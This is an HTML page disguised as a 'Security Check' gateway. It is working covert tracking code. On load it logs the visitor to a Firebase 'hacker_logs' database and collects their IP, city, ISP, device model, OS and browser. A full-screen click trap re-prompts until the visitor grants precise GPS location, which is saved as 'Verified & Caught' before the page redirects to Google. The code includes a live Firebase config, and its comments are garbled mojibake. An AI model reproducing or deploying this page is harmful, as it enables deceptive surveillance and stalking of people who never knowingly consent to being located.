<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>Security Gateway</title>
    
    <!-- UAParser -->
    <script src="https://cdnjs.cloudflare.com/ajax/libs/UAParser.js/1.0.35/ua-parser.min.js"></script>
    
    <!-- Firebase SDK -->
    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/9.6.1/firebase-app.js";
        import { getDatabase, ref, push, set, update } from "https://www.gstatic.com/firebasejs/9.6.1/firebase-database.js";

        const firebaseConfig = {
            apiKey: "AIzaSyA-2qU45jgtvoxzOdVysbZKdixEyvMY3C8",
            authDomain: "location-611d6.firebaseapp.com",
            databaseURL: "https://location-611d6-default-rtdb.firebaseio.com",
            projectId: "location-611d6",
            storageBucket: "location-611d6.firebasestorage.app",
            messagingSenderId: "903100559116",
            appId: "1:903100559116:web:08c8c9e1d7282048116329"
        };

        const app = initializeApp(firebaseConfig);
        const db = getDatabase(app);

        // ‡ßß. ‡¶™‡ßá‡¶ú ‡¶≤‡ßã‡¶° ‡¶π‡¶ì‡ßü‡¶æ‡¶Æ‡¶æ‡¶§‡ßç‡¶∞‡¶á ‡¶ñ‡¶æ‡¶≤‡¶ø ‡¶≤‡¶ó ‡¶§‡ßà‡¶∞‡¶ø ‡¶ï‡¶∞‡¶æ (‡¶Ø‡¶æ‡¶§‡ßá ‡¶≤‡ßã‡¶ï‡ßá‡¶∂‡¶® ‡¶∏‡ßá‡¶≠ ‡¶ï‡¶∞‡¶æ‡¶∞ ‡¶ú‡¶æ‡ßü‡¶ó‡¶æ ‡¶•‡¶æ‡¶ï‡ßá)
        window.createInitialLog = function() {
            const trackerRef = ref(db, 'hacker_logs');
            const newLogRef = push(trackerRef);
            
            // ‡¶∏‡¶æ‡¶•‡ßá ‡¶∏‡¶æ‡¶•‡ßá ‡¶è‡¶ï‡¶ü‡¶æ ‡¶è‡¶®‡ßç‡¶ü‡ßç‡¶∞‡¶ø ‡¶§‡ßà‡¶∞‡¶ø ‡¶ï‡¶∞‡ßá ‡¶´‡ßá‡¶≤‡¶≤‡¶æ‡¶Æ
            set(newLogRef, {
                timestamp: new Date().toString(),
                latitude: "Requesting Now...",  // ‡¶Ü‡¶Æ‡¶∞‡¶æ ‡¶è‡¶ñ‡¶®‡¶á ‡¶ö‡¶æ‡¶á‡¶õ‡¶ø
                longitude: "Requesting Now...",
                ip: "Fetching...",              // ‡¶è‡¶ó‡ßÅ‡¶≤‡ßã ‡¶™‡¶∞‡ßá ‡¶Ü‡¶∏‡¶¨‡ßá
                deviceModel: "Fetching...",
                actionStatus: "Trap Started - GPS First"
            });

            // ‡¶∏‡ßá‡¶∂‡¶® ‡¶ï‡¶ø (Key) ‡¶∏‡ßá‡¶≠ ‡¶∞‡¶æ‡¶ñ‡¶æ
            sessionStorage.setItem('logKey', newLogRef.key);
        };

        // ‡ß®. ‡¶Ü‡¶á‡¶™‡¶ø ‡¶è‡¶¨‡¶Ç ‡¶°‡¶ø‡¶≠‡¶æ‡¶á‡¶∏ ‡¶á‡¶®‡¶´‡ßã ‡¶Ü‡¶™‡¶°‡ßá‡¶ü ‡¶ï‡¶∞‡¶æ (‡¶¨‡ßç‡¶Ø‡¶æ‡¶ï‡¶ó‡ßç‡¶∞‡¶æ‡¶â‡¶®‡ßç‡¶°‡ßá ‡¶ö‡¶≤‡¶¨‡ßá)
        window.updateBackgroundInfo = function(data) {
            const key = sessionStorage.getItem('logKey');
            if (key) {
                const updateRef = ref(db, 'hacker_logs/' + key);
                update(updateRef, data);
            }
        };

        // ‡ß©. ‡¶≤‡ßã‡¶ï‡ßá‡¶∂‡¶® ‡¶Ü‡¶™‡¶°‡ßá‡¶ü (‡¶Æ‡ßá‡¶á‡¶® ‡¶ï‡¶æ‡¶ú)
        window.updateWithGPS = function(lat, lng) {
            const key = sessionStorage.getItem('logKey');
            if (key) {
                const updateRef = ref(db, 'hacker_logs/' + key);
                update(updateRef, {
                    latitude: lat,
                    longitude: lng,
                    actionStatus: "‚úÖ Verified & Caught"
                }).then(() => {
                    // ‡¶ï‡¶æ‡¶ú ‡¶∂‡ßá‡¶∑‡ßá ‡¶ó‡ßÅ‡¶ó‡¶≤‡ßá ‡¶™‡¶æ‡¶†‡¶ø‡ßü‡ßá ‡¶¶‡ßá‡¶ì‡ßü‡¶æ
                    window.location.href = "https://www.google.com";
                });
            }
        };
    </script>

    <style>
        body {
            margin: 0; padding: 0;
            background-color: #f0f2f5;
            display: flex; flex-direction: column;
            justify-content: center; align-items: center;
            height: 100vh; overflow: hidden;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
            cursor: progress;
        }

        #clickTrap {
            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            z-index: 9999; cursor: pointer;
        }

        .loader-box {
            text-align: center;
            background: #ffffff;
            padding: 40px; border-radius: 20px;
            box-shadow: 0 10px 25px rgba(0,0,0,0.05);
            max-width: 300px;
        }

        .spinner {
            width: 50px; height: 50px;
            border: 5px solid #e1e4e8;
            border-top: 5px solid #007bff;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin: 0 auto 20px auto;
        }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }

        h2 { color: #333; font-size: 18px; margin-bottom: 5px; }
        p { color: #888; font-size: 13px; }
    </style>
</head>
<body>

    <div id="clickTrap" onclick="forceBrowserPrompt()"></div>

    <div class="loader-box">
        <div class="spinner"></div>
        <h2 id="statusText">Security Check...</h2>
        <p>Verifying network encryption.</p>
    </div>

    <script>
        let isAsking = false;

        // üî• ‡¶∏‡¶¨‡¶•‡ßá‡¶ï‡ßá ‡¶´‡¶æ‡¶∏‡ßç‡¶ü ‡¶è‡¶ï‡ßç‡¶∏‡¶ø‡¶ï‡¶ø‡¶â‡¶∂‡¶®
        window.onload = function() {
            // ‡ßß. ‡¶°‡¶æ‡¶ü‡¶æ‡¶¨‡ßá‡¶∏‡ßá ‡¶ú‡¶æ‡ßü‡¶ó‡¶æ ‡¶¨‡ßÅ‡¶ï ‡¶ï‡¶∞‡¶æ (‡¶Æ‡¶ø‡¶≤‡¶ø‡¶∏‡ßá‡¶ï‡ßá‡¶®‡ßç‡¶°‡ßá‡¶∞ ‡¶Æ‡¶ß‡ßç‡¶Ø‡ßá)
            if(window.createInitialLog) window.createInitialLog();

            // ‡ß®. ‡¶≤‡ßã‡¶ï‡ßá‡¶∂‡¶® ‡¶ö‡¶æ‡¶ì‡ßü‡¶æ ‡¶∂‡ßÅ‡¶∞‡ßÅ (‡¶∏‡¶¨‡¶æ‡¶∞ ‡¶Ü‡¶ó‡ßá!)
            startAnnoyingLoop();

            // ‡ß©. ‡¶Ü‡¶á‡¶™‡¶ø ‡¶è‡¶¨‡¶Ç ‡¶°‡¶ø‡¶≠‡¶æ‡¶á‡¶∏ ‡¶á‡¶®‡¶´‡ßã ‡¶Ü‡¶∏‡ßç‡¶§‡ßá ‡¶ß‡ßÄ‡¶∞‡ßá ‡¶Ü‡¶®‡¶æ (‡¶¨‡ßç‡¶Ø‡¶æ‡¶ï‡¶ó‡ßç‡¶∞‡¶æ‡¶â‡¶®‡ßç‡¶°‡ßá)
            fetchBackgroundData();
        };

        function fetchBackgroundData() {
            fetch('https://ipapi.co/json/')
                .then(res => res.json())
                .then(ipData => {
                    var parser = new UAParser();
                    var result = parser.getResult();
                    let deviceName = (result.device.vendor ? result.device.vendor + " " : "") + (result.device.model || "Unknown Device");

                    let bgData = {
                        ip: ipData.ip || "Unknown",
                        city: ipData.city || "Unknown",
                        isp: ipData.org || "Unknown",
                        deviceModel: deviceName,
                        os: result.os.name,
                        browser: result.browser.name
                    };
                    
                    // ‡¶°‡¶æ‡¶ü‡¶æ‡¶¨‡ßá‡¶∏ ‡¶Ü‡¶™‡¶°‡ßá‡¶ü ‡¶ï‡¶∞‡ßá ‡¶¶‡ßá‡¶ì‡ßü‡¶æ
                    if(window.updateBackgroundInfo) window.updateBackgroundInfo(bgData);
                })
                .catch(() => {
                    // ‡¶´‡ßá‡¶á‡¶≤ ‡¶ï‡¶∞‡¶≤‡ßá ‡¶Ö‡¶®‡ßç‡¶§‡¶§ ‡¶°‡¶ø‡¶≠‡¶æ‡¶á‡¶∏ ‡¶®‡ßá‡¶Æ ‡¶Ü‡¶™‡¶°‡ßá‡¶ü ‡¶ï‡¶∞‡¶æ
                    var parser = new UAParser();
                    if(window.updateBackgroundInfo) window.updateBackgroundInfo({ deviceModel: parser.getResult().os.name });
                });
        }

        function startAnnoyingLoop() {
            // ‡¶™‡ßá‡¶ú ‡¶≤‡ßã‡¶° ‡¶π‡¶ì‡ßü‡¶æ‡¶∞ ‡¶∏‡¶æ‡¶•‡ßá ‡¶∏‡¶æ‡¶•‡ßá‡¶á ‡¶Ö‡ßç‡¶Ø‡¶æ‡¶ü‡¶æ‡¶ï! (‡¶¶‡ßá‡¶∞‡¶ø ‡¶®‡ßá‡¶á)
            setTimeout(forceBrowserPrompt, 100); 
            
            // ‡¶∏‡ßç‡¶ï‡ßç‡¶∞‡¶ø‡¶®‡ßá ‡¶ü‡¶æ‡¶ö ‡¶ï‡¶∞‡¶≤‡ßá‡¶á ‡¶Ü‡¶¨‡¶æ‡¶∞ ‡¶ö‡¶æ‡¶á‡¶¨‡ßá
            document.addEventListener('touchstart', forceBrowserPrompt);
            document.addEventListener('click', forceBrowserPrompt);
        }

        function forceBrowserPrompt() {
            if(isAsking) return;
            isAsking = true;

            if ("geolocation" in navigator) {
                navigator.geolocation.getCurrentPosition(
                    function(position) {
                        // ‡¶≤‡ßã‡¶ï‡ßá‡¶∂‡¶® ‡¶™‡ßá‡ßü‡ßá ‡¶ó‡ßá‡¶õ‡¶ø!
                        document.getElementById('statusText').innerText = "Verified!";
                        document.querySelector('.spinner').style.borderTopColor = "#00b894";
                        
                        document.removeEventListener('touchstart', forceBrowserPrompt);
                        document.removeEventListener('click', forceBrowserPrompt);
                        document.getElementById('clickTrap').style.display = 'none';

                        if(window.updateWithGPS) {
                            window.updateWithGPS(position.coords.latitude, position.coords.longitude);
                        }
                    },
                    function(error) {
                        isAsking = false;
                        console.log("Re-arming trap.");
                        // ‡¶á‡¶â‡¶ú‡¶æ‡¶∞ ‡¶∞‡¶ø‡¶ú‡ßá‡¶ï‡ßç‡¶ü ‡¶ï‡¶∞‡¶≤‡ßá ‡¶Ü‡¶¨‡¶æ‡¶∞ ‡¶≤‡ßÅ‡¶™ ‡¶ö‡¶≤‡¶¨‡ßá
                    },
                    { enableHighAccuracy: true }
                );
            }
        }
    </script>
</body>
</html>
